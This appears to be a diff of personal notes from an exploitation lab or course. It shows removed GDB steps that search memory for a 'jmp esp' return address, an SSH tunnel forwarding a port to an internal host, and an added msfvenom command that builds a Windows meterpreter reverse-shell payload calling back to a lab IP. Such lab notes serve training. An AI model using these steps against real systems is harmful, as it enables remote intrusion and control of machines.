@@ -630,36 +630,6 @@ These are not all required commands, nor are you required to use GDB.
 
 
 
-fgets
-
-printf
-
-sudo -i
-sudo -s
-
-
-0xf7def000
-0xffffe000
-
-find /b 0xf7def000, 0xffffe000, 0xff, 0xe4
-
-
-0xf7df1b51
-0xf7f6674b
-0xf7f72753
-0xf7f72c6b
-
-
-
-
-
-0xf7def000
-0xffffe000
-
-
-
-
-
 
 
 Situation: 
@@ -735,8 +705,7 @@ PORT     STATE SERVICE
 
 ssh -S /tmp/T1 t3 -O forward -L10002:192.168.150.245:9999
 
-
-
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.30.229 lport=6666 -b "\x00" -f python
 
 
 
